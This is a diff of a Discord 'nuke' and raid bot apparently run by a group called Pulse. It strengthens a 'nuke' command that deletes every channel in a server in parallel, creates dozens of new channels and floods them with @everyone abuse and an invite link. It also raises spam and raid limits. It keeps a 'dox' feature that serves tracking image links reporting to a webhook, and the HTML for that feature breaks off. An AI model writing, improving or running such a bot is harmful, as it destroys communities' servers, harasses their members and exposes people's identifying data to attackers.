@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');
 const crypto = require('crypto');
 const express = require('express');
 const app = express();
@@ -9,18 +9,14 @@ const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/hW3djeNKu';
 const PORT = process.env.PORT || 3000;
 
-// ---- CLIENT (NO DISALLOWED INTENTS) ----
+// ---- CLIENT ----
 const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,          // needed for servers
-        GatewayIntentBits.GuildMessages    // needed for sending messages
-        // REMOVED: MessageContent, GuildMembers, DirectMessages
-    ]
+    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
 });
 
 const links = new Map();
 
-// ---- EXPRESS SERVER (for dox) ----
+// ---- DOX SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -35,11 +31,19 @@ client.once('ready', async () => {
     console.log(`🤖 ${client.user.tag} ready`);
     await client.application.commands.set([
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
-        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Number of messages', required: true }, { name: 'message', type: 3, description: 'Message to spam', required: true }] },
-        { name: 'raid', description: 'Raid with default message', options: [{ name: 'count', type: 4, description: 'Lines (max 35)', required: false }] },
-        { name: 'nuke', description: 'Delete all channels, create new, spam @everyone' },
-        { name: 'ad', description: 'Advertise the server invite' },
-        { name: 'purge', description: 'Delete messages', options: [{ name: 'amount', type: 4, description: 'Number of messages', required: true }, { name: 'user', type: 6, description: 'Target user (optional)', required: false }] }
+        { name: 'spam', description: 'Spam a channel', options: [{ name: 'count', type: 4, description: 'Messages', required: true }, { name: 'message', type: 3, description: 'Content', required: true }] },
+        { name: 'raid', description: 'Raid spam', options: [{ name: 'count', type: 4, description: 'Lines (max 50)', required: false }] },
+        { 
+            name: 'nuke', 
+            description: 'Delete all channels, create new, spam big', 
+            options: [
+                { name: 'channels', type: 4, description: 'Number of new channels (default 20)', required: false },
+                { name: 'messages', type: 4, description: 'Spam lines per channel (default 50)', required: false },
+                { name: 'delay', type: 4, description: 'Delay in ms between sends (0 = max speed)', required: false }
+            ]
+        },
+        { name: 'ad', description: 'Advertise the server' },
+        { name: 'purge', description: 'Delete messages', options: [{ name: 'amount', type: 4, description: 'Number', required: true }, { name: 'user', type: 6, description: 'Target user', required: false }] }
     ]);
     console.log('✅ Commands loaded');
 });
@@ -67,27 +71,26 @@ client.on('interactionCreate', async (interaction) => {
         const msg = interaction.options.getString('message');
         const channel = interaction.channel;
         if (!channel) return interaction.editReply('❌ No channel.');
-        for (let i = 0; i < Math.min(count, 100); i++) {
-            await channel.send(msg).catch(() => {});
-        }
-        await interaction.editReply(`✅ Spammed ${Math.min(count, 100)} messages.`);
+        const max = Math.min(count, 100);
+        for (let i = 0; i < max; i++) await channel.send(msg).catch(() => {});
+        await interaction.editReply(`✅ Spammed ${max} messages.`);
         return;
     }
 
     // ---- RAID ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
-        const count = Math.min(interaction.options.getInteger('count') || 20, 35);
+        const count = Math.min(interaction.options.getInteger('count') || 30, 50);
         const lines = [];
         for (let i = 0; i < count; i++) lines.push('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
-        lines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
+        lines.push(`join pulse to get nuke power: ${INVITE_LINK}`);
         const msg = lines.join('\n');
         await interaction.channel.send(msg).catch(() => {});
         await interaction.editReply(`✅ Raid sent (${count} lines).`);
         return;
     }
 
-    // ---- NUKE ----
+    // ---- NUKE (MAX SPEED) ----
     if (interaction.commandName === 'nuke') {
         await interaction.deferReply({ ephemeral: true });
         const guild = interaction.guild;
@@ -95,22 +98,42 @@ client.on('interactionCreate', async (interaction) => {
         if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return interaction.editReply('❌ I need Administrator.');
         }
+
+        const channelCount = Math.min(interaction.options.getInteger('channels') || 20, 50);
+        const msgCount = Math.min(interaction.options.getInteger('messages') || 50, 200);
+        const delay = interaction.options.getInteger('delay') || 0;
+
         try {
-            // Delete all channels
-            const channels = guild.channels.cache;
-            for (const [id, ch] of channels) {
-                await ch.delete().catch(() => {});
-            }
-            // Create 10 new text channels named "pulse"
-            for (let i = 0; i < 10; i++) {
-                const newCh = await guild.channels.create({ name: 'pulse', type: 0 });
-                // Spam @everyone raid
-                for (let j = 0; j < 10; j++) {
-                    await newCh.send('@everyone THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL').catch(() => {});
-                }
-                await newCh.send(`join pulse to get raids like this: ${INVITE_LINK}`).catch(() => {});
-            }
-            await interaction.editReply('✅ Nuked. Channels deleted, new ones created, spammed @everyone.');
+            // 1. Delete all channels (parallel)
+            await Promise.all(guild.channels.cache.map(ch => ch.delete().catch(() => {})));
+
+            // 2. Create new channels (parallel)
+            const newChannels = await Promise.all(
+                Array.from({ length: channelCount }, () =>
+                    guild.channels.create({ name: 'pulse', type: 0 }).catch(() => null)
+                )
+            );
+            const valid = newChannels.filter(c => c !== null);
+
+            // 3. Build the big spam message
+            const spamLines = [];
+            for (let i = 0; i < msgCount; i++) spamLines.push('THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
+            spamLines.push(`join pulse to get nuke power: ${INVITE_LINK}`);
+            const bigMessage = spamLines.join('\n');
+
+            // 4. Send to all channels in parallel (with optional delay per channel)
+            const sendPromises = valid.map((ch, index) => {
+                // If delay > 0, stagger channels slightly
+                return new Promise(resolve => {
+                    setTimeout(async () => {
+                        await ch.send(`@everyone ${bigMessage}`).catch(() => {});
+                        resolve();
+                    }, index * delay);
+                });
+            });
+            await Promise.all(sendPromises);
+
+            await interaction.editReply(`✅ Nuked. Deleted all channels, created ${valid.length} new ones, spammed ${msgCount} lines each with @everyone.`);
         } catch (e) {
             await interaction.editReply('❌ Nuke failed: ' + e.message);
         }
@@ -122,7 +145,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.deferReply({ ephemeral: true });
         const channel = interaction.channel;
         if (!channel) return interaction.editReply('❌ No channel.');
-        const msg = `🔥 JOIN PULSE 🔥\n${INVITE_LINK}\nGet raiding power!`;
+        const msg = `🔥 PULSE NUKE POWER 🔥\n${INVITE_LINK}`;
         await channel.send(msg).catch(() => {});
         await interaction.editReply('✅ Ad sent.');
         return;
@@ -146,7 +169,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML (supercharged) ----
+// ---- DOX HTML (unchanged, full power) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title></title><style>body{background:#fff;margin:0;height:100vh}</style></head>
